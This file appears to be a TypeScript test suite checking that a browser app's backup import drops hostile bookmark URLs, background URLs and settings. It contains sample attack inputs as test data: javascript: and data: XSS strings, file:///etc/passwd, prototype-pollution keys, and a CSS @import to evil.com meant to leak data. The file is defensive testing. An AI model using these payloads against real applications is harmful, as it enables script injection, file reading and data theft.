import assert from 'node:assert/strict';
import { isSafeNavigationUrl } from '../src/utils/safeNavigation';
import { sanitizeImportedBookmarks, sanitizeImportedSettings } from '../src/hooks/useAppDataBackup';

console.log('\n--- Data Backup & Security Sanitization Test Suite ---');

// 1. URL Sanitization for Bookmarks & History
//
// The filter below used to be re-declared in this file and then asserted
// against itself. It is now the shipped sanitiser from
// src/hooks/useAppDataBackup.ts:166, so a change to the real import policy
// shows up here instead of being mirrored in a private copy.
const testBookmarksRaw = [
  { id: '1', title: 'Google', url: 'https://google.com', createdAt: Date.now() },
  { id: '2', title: 'XSS Injection', url: 'javascript:alert(1)', createdAt: Date.now() },
  { id: '3', title: 'Data HTML Exploit', url: 'data:text/html,<script>alert(1)</script>', createdAt: Date.now() },
  { id: '4', title: 'Local File Traversal', url: 'file:///etc/passwd', createdAt: Date.now() },
  { id: '5', title: 'Blob Exploit', url: 'blob:https://example.com/uuid', createdAt: Date.now() },
  { id: '6', title: 'Internal Nova Settings', url: 'nova://settings', createdAt: Date.now() },
  { id: '7', title: 'Local Development Server', url: 'http://localhost:5173', createdAt: Date.now() },
  { id: '8', title: 'Malformed Object', url: 12345, createdAt: Date.now() },
  null,
  undefined,
];

const sanitizedBookmarks = sanitizeImportedBookmarks(testBookmarksRaw);

assert.deepStrictEqual(
  sanitizedBookmarks.map((b) => b.url),
  ['https://google.com', 'nova://settings', 'http://localhost:5173'],
  'Only safe navigation URLs (Google, Nova Settings, Localhost) must be retained, in source order'
);
assert.deepStrictEqual(
  sanitizedBookmarks.map((b) => b.id),
  ['1', '6', '7'],
  'Retained rows must keep their original ids'
);

console.log('[PASS] [Backup Sanitization] Dangerous bookmark schemes (javascript, data, blob, file) strictly rejected');

// 2. Settings Sanitization Engine
//
// REMOVED (was false assurance): a 25-line `sanitizeSettingsImport` was declared
// in this file whose enum lists were character-identical copies of
// src/hooks/useAppDataBackup.ts:110-131, and the suite then asserted that copy
// against its own inputs. Section 3 went further and asserted
// /^#[0-9a-fA-F]{3,8}$/ against vectors using a regex written inline in the test
// -- unfalsifiable by construction.
//
// The settings allowlist is not reachable from a test today: it lives inline in
// the body of `useAppDataBackup` and is not exported. Exporting it is required
// before the enum allowlist can be covered for real. Until then the only part of
// the settings policy that IS a real, exported predicate is the custom
// background URL, so that is what is exercised here -- see
// src/hooks/useAppDataBackup.ts:127.
const HOSTILE_BACKGROUND_URLS = [
  'javascript:alert(document.cookie)',
  'data:text/html,<script>alert(1)</script>',
  'file:///etc/passwd',
  'blob:https://example.com/uuid',
  'not-a-url-at-all',
];
for (const url of HOSTILE_BACKGROUND_URLS) {
  assert.strictEqual(
    isSafeNavigationUrl(url),
    false,
    `backgroundCustomUrl must be dropped for hostile URL: ${url}`
  );
}

const VALID_BACKGROUND_URL = 'https://images.unsplash.com/photo-123';
assert.strictEqual(
  isSafeNavigationUrl(VALID_BACKGROUND_URL),
  true,
  'A legitimate https backgroundCustomUrl must be retained'
);

console.log('[PASS] [Backup Sanitization] Hostile backgroundCustomUrl values are dropped by the shipped predicate');

// 3. Settings Sanitization with DesignProfile & WorkspaceDesigns
const hostileSettingsRaw = {
  theme: 'dark',
  searchEngine: 'duckduckgo',
  useVerticalTabs: true,
  // Malicious prototype pollution attempts
  __proto__: { isAdmin: true },
  constructor: { malicious: true },
  // Malicious workspace designs
  workspaceDesigns: {
    __proto__: { polluted: true },
    constructor: { polluted: true },
    prototype: { polluted: true },
    '': { meta: { name: 'Empty' } },
    'valid-ws': {
      meta: { name: 'Valid Workspace Theme' },
      layout: { chromeMode: 'vertical-left', sidebarWidth: 280 },
      customCss: { enabled: true, css: 'body { background: red; } <script>alert(1)</script>' },
    },
    'invalid-ws-number': 12345,
    'invalid-ws-null': null,
  },
  // Malformed designProfile with out-of-range values and dangerous CSS
  designProfile: {
    meta: { version: 1, name: 'Hacked Theme' },
    layout: {
      chromeMode: 'invalid-mode',
      sidebarWidth: 99999, // Should clamp to 360
    },
    customCss: {
      enabled: true,
      css: 'body { position: fixed; } @import url("https://evil.com/leak.css");',
    },
  },
};

const sanitizedSettings = sanitizeImportedSettings(hostileSettingsRaw);

// Prototype pollution checks
assert.strictEqual(
  Object.prototype.hasOwnProperty.call(sanitizedSettings, '__proto__'),
  false,
  '__proto__ must never be on sanitized settings'
);
assert.strictEqual((sanitizedSettings as any).isAdmin, undefined);

// Workspace designs validation
assert.ok(sanitizedSettings.workspaceDesigns, 'workspaceDesigns must be present');
assert.strictEqual(
  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, '__proto__'),
  false,
  '__proto__ key must be rejected from workspaceDesigns'
);
assert.strictEqual(
  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, 'constructor'),
  false,
  'constructor key must be rejected from workspaceDesigns'
);
assert.strictEqual(
  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, 'prototype'),
  false,
  'prototype key must be rejected from workspaceDesigns'
);
assert.strictEqual(
  sanitizedSettings.workspaceDesigns['valid-ws']?.layout?.chromeMode,
  'vertical-left',
  'Valid workspace design layout chromeMode must be preserved'
);
assert.strictEqual(
  sanitizedSettings.workspaceDesigns['valid-ws']?.layout?.sidebarWidth,
  280,
  'Valid workspace design sidebar width must be preserved'
);
// Invalid workspace designs should be ignored
assert.strictEqual(
  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, 'invalid-ws-number'),
  false,
  'Non-object workspace entry must be dropped'
);
assert.strictEqual(
  Object.prototype.hasOwnProperty.call(sanitizedSettings.workspaceDesigns, 'invalid-ws-null'),
  false,
  'Null workspace entry must be dropped'
);

// Design profile validation
assert.ok(sanitizedSettings.designProfile, 'designProfile must be sanitized and present');
assert.strictEqual(
  sanitizedSettings.designProfile.layout.sidebarWidth,
  360,
  'Out-of-range sidebar width must be clamped to 360'
);
assert.strictEqual(
  ['classic-top', 'compact-single-row', 'vertical-left', 'vertical-right'].includes(
    sanitizedSettings.designProfile.layout.chromeMode
  ),
  true,
  'Invalid chromeMode must be normalized to a valid default'
);

console.log('[PASS] [Backup Sanitization] designProfile and workspaceDesigns sanitized cleanly without prototype pollution');

